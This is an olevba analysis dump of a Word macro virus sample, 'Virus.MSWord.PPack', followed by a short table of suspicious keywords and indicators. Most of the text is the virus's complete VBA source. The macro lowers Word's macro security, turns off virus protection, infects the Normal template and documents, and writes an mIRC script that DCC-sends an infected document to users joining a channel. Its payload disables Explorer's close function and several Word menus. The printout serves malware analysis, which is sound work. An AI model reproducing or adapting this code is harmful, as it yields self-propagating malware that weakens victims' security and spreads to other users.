olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.PPack
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.PPack - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO revenge.bas 
in file: Virus.MSWord.PPack - OLE stream: 'Macros/VBA/revenge'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub FileSave()
On Error Resume Next

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&

With Options
.VirusProtection = 0
.SaveNormalPrompt = 0
.ConfirmConversions = 0
End With
With Application
.UserName = "pickpacket"
.UserAddress = "rRlf;PVW"
.UserInitials = "ppacket"
End With

Set NTx = NormalTemplate.VBProject.VBComponents
Set ADx = ActiveDocument.VBProject.VBComponents


    If NTx.Item("revenge").Name <> "revenge" Then
    ADx("revenge").export "c:\ppacket.vxd"
    Nactive = True
    ElseIf ADx.Item("revenge").Name <> "revenge" Then
    NTx("revenge").export "c:\ppacket.vxd"
    Aactive = True
    End If
    
    If Nactive Then
    NTx.import "c:\ppacket.vxd"
    NormalTemplate.Save
    ElseIf Aactive Then
    ADx.import "c:\ppacket.vxd"
    ActiveDocument.Save
    End If

father = Dir("c:\mirc\mirc.exe")
If father <> "" Then

worm = Dir("c:\mirc\downloads\father.txt.doc")
If worm = "" Then
wormfile = "c:\mirc\downloads\father.txt.doc"
ActiveDocument.SaveAs "c:\mirc\downloads\father.txt.doc"
Open "c:\mirc\script.ini" For Output As #1
Print #1, "[script]"
Print #1, ""
Print #1, "n0=On Join:#:if ($me != $nick) then {/dcc send (" & wormfile & ")"
Print #1, "n1=On Connect"
Print #1, "n2=/clear"
Print #1, "n3=/motd"
Print #1, "n4=}"
Close #1
End If
End If
If Second(Now) = Int((Rnd * 60) + 1) Then
Call revenge
End If
Dialogs(wdDialogFileSave).Show
End Sub
Sub revenge()
On Error Resume Next

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer", "NoClose") = 1&
MsgBox "This is a manifesto on my father as an asshole!!", vbInformation, "W97M_Revenge"
End Sub

Sub shadow()
On Error Resume Next

CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Tools").Controls("Customize...").Enabled = False
CommandBars("Tools").Controls("Templates and Add-Ins...").Enabled = False
CommandBars("Tools").Controls("Macro").Enabled = False
CommandBars("Format").Controls("Style...").Enabled = False
CommandBars("View").Controls("Toolbars").Enabled = False
 
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |mirc.exe            |Executable file name                         |
+----------+--------------------+---------------------------------------------+

